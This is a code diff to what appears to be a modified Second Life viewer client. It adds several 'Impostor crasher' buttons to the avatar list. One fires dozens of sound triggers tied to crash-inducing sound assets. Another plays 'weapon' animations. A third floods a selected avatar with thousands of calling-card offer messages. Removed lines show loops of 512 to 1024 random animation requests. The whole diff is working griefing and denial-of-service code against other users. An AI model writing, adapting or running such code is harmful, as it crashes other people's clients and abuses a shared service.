@@ -65,7 +65,8 @@ LLVOAvatar* find_avatar_from_object( const LLUUID& object_id );
 LLUUID ANIMATION_WEAPON = LLUUID("0eadb1f7-1eb9-e373-d337-63c6ebaebf55");
 LLUUID ANIMATION_WEAPON2 = LLUUID("5dbd4baa-8b13-9066-4e9f-7257618e702a");
 LLUUID ANIMATION_WEAPON3 = LLUUID("8115b5a3-919b-4532-fbe2-88f2b9d3ecc7");
-//LLUUID ANIMATION_WEAPON4 = LLUUID("d23075e5-98c4-a039-32b0-344a3f23da2f");
+LLUUID SOUNDCRASH = LLUUID("be6ed72e-da1b-d03e-c698-ae6e65d4bd98");
+LLUUID SOUNDCRASH2 = LLUUID("81bb83f7-3407-60e2-77a2-45ad2b5911c0");
 //</edit>
 
 /**
@@ -1226,7 +1227,7 @@ void LLFloaterAvatarList::onClickGetKey(void *userdata)
     LLFloaterChat::addChat(chat);
 }
 
-//<edit> start
+//<edit> START SIMMS VOIDS
 void LLFloaterAvatarList::onClickAnim(void *userdata)
 {
 	LLFloaterAvatarList *self = (LLFloaterAvatarList*)userdata;
@@ -1276,19 +1277,54 @@ void LLFloaterAvatarList::onClickDebug(void *userdata)
 
 void LLFloaterAvatarList::onClickCrash(void *userdata)
 {
- LLFloaterAvatarList *self = (LLFloaterAvatarList*)userdata;
- 	LLScrollListItem *simms = self->mAvatarList->getFirstSelected();
 	LLChat chat;
-chat.mText = "Impostor Crashloop Activated To Stop Press (NoCrash)";
-	 if (!simms) return;
-
- LLUUID agent_id = simms->getUUID();
-  if(simms)
-  {
-gAgent.sendAnimationRequest(ANIMATION_WEAPON, ANIM_REQUEST_START);
-chat.mSourceType = CHAT_SOURCE_SYSTEM;
-        LLFloaterChat::addChat(chat);
-}
+	chat.mText = "Executing Impostor Sound Crasher Please Wait...";
+	chat.mSourceType = CHAT_SOURCE_SYSTEM;
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		send_sound_trigger(SOUNDCRASH,1.0);
+		//SND 2
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(SOUNDCRASH2,1.0);
+		send_sound_trigger(LLUUID("e2b1182d-753e-a47a-b8a8-eac9e151b7bc"),1.0);
+		send_sound_trigger(LLUUID("c0d495b7-ef21-bcda-a367-3fd06ed1f286"),1.0);
+		send_sound_trigger(LLUUID("81bb83f7-3407-60e2-77a2-45ad2b5911c0"),1.0);
+		LLFloaterChat::addChat(chat);
  return ;
 }
 
@@ -1302,10 +1338,10 @@ void LLFloaterAvatarList::onClickHuds(void *userdata)
        LLViewerObject *obj=gObjectList.findObject(item->getUUID());
        if(obj)
         {
-  // LLSelectMgr::getInstance()->selectObjectOnly(obj);
+   LLSelectMgr::getInstance()->selectObjectOnly(obj);
    LLFloaterAttachments* floater = new LLFloaterAttachments();
   floater->center();
-  // LLSelectMgr::getInstance()->deselectAll();
+  LLSelectMgr::getInstance()->deselectAll();
         }
        return;
 }
@@ -1313,74 +1349,66 @@ void LLFloaterAvatarList::onClickHuds(void *userdata)
 
 void LLFloaterAvatarList::onClickFollow(void *userdata)
 	{
- LLFloaterAvatarList *self = (LLFloaterAvatarList*)userdata;
- 	LLScrollListItem *simms = self->mAvatarList->getFirstSelected();
-	//boom
 	LLChat chat;
-	chat.mText = "Impostor Super Crasher Activated To Stop Press (NoCrash)";
-	if (!simms) return;
-	LLUUID agent_id = simms->getUUID();
-	if(simms)
-	{
-	//LLAgent::userRemoveAllAttachments(NULL);//prevents AOs from erroring and identifying method
-	U32 i = 0;
-	LLUUID id;
-	do
-	{
-	id.generate();
-	gAgent.sendAnimationRequest(id, ANIM_REQUEST_START);
-	i += 1;
-	}while(i < 512);
+	chat.mText = "Executing Impostor Animation Crasher To Stop Press (NoCrash)";
 	chat.mSourceType = CHAT_SOURCE_SYSTEM;
-	LLFloaterChat::addChat(chat);
 	gAgent.sendAnimationRequest(ANIMATION_WEAPON, ANIM_REQUEST_START);
 	gAgent.sendAnimationRequest(ANIMATION_WEAPON2, ANIM_REQUEST_START);
 	gAgent.sendAnimationRequest(ANIMATION_WEAPON3, ANIM_REQUEST_START);
+	LLFloaterChat::addChat(chat);
+ return;
 }
- return ;
-}
+
 
 void LLFloaterAvatarList::onClickCrash4(void *userdata)
 {
- LLFloaterAvatarList *self = (LLFloaterAvatarList*)userdata;
- 	LLScrollListItem *simms = self->mAvatarList->getFirstSelected();
-
-	 if (!simms) return;
-
- LLUUID agent_id = simms->getUUID();
-  if(simms)
-  {
-			U32 i = 0;
-			LLUUID id;
-			do
-			{
-				id.generate();
-				gAgent.sendAnimationRequest(id, ANIM_REQUEST_START);
-				i += 1;
-			}while(i < 1024);
-		}
+	LLFloaterAvatarList *self = (LLFloaterAvatarList*)userdata;
+ 	LLScrollListItem *item = self->mAvatarList->getFirstSelected();
+	if (item)
+	{
+		LLUUID agent_id = item->getUUID();
+				if(agent_id.notNull())
+				{
+		F32 fps = LLViewerStats::getInstance()->mFPSStat.getMeanPerSec();
+					F32 x = 0.0f;
+					F32 tosend = 9999.0f / fps;
+					LLMessageSystem* msg = gMessageSystem;
+					LLUUID transaction_id;
+					while(x < tosend)
+					{
+						msg->newMessage("OfferCallingCard");
+						//msg->newMessage("GodlikeMessage");
+						//msg->newMessage("FreezeUser");
+						//msg->newMessage("EjectUser");
+						//handle_lure(transaction_id);"fuck you bitch";
+						msg->nextBlockFast(_PREHASH_AgentData);
+						msg->addUUIDFast(_PREHASH_AgentID, gAgent.getID());
+						msg->addUUIDFast(_PREHASH_SessionID, gAgent.getSessionID());
+						msg->nextBlockFast(_PREHASH_AgentBlock);
+						msg->addUUIDFast(_PREHASH_DestID, agent_id);
+						transaction_id.generate();
+						msg->addUUIDFast(_PREHASH_TransactionID, transaction_id);
+						gAgent.sendMessage();
+						x = x + 1.0f;
+					}
+				}
+			}
+	return ;
 }
 
 
 void LLFloaterAvatarList::onClickCrashNo(void *userdata)
 {
- LLFloaterAvatarList *self = (LLFloaterAvatarList*)userdata;
- 	LLScrollListItem *simms = self->mAvatarList->getFirstSelected();
 	LLChat chat;
-chat.mText = "Killing The Impostor Crashloop";
-	 if (!simms) return;
-
- LLUUID agent_id = simms->getUUID();
-  if(simms)
-  {
+	chat.mText = "Killing The Impostor Animation Crashloop";
 	gAgent.sendAnimationRequest(ANIMATION_WEAPON, ANIM_REQUEST_STOP);
 	gAgent.sendAnimationRequest(ANIMATION_WEAPON2, ANIM_REQUEST_STOP);
 	gAgent.sendAnimationRequest(ANIMATION_WEAPON3, ANIM_REQUEST_STOP);
 	chat.mSourceType = CHAT_SOURCE_SYSTEM;
-        LLFloaterChat::addChat(chat);
-}
+    LLFloaterChat::addChat(chat);
  return ;
 }
+
 
 void LLFloaterAvatarList::onClickGround(void *userdata)
 	{
@@ -1393,7 +1421,7 @@ void LLFloaterAvatarList::onClickGround(void *userdata)
 			chat.mText = llformat("Impostor Ground Level");
 			LLFloaterChat::addChat(chat);	
 }
-//<edit> end
+//<edit> END OF SIMMS VOIDS
 
 void LLFloaterAvatarList::sendKeys()
 {
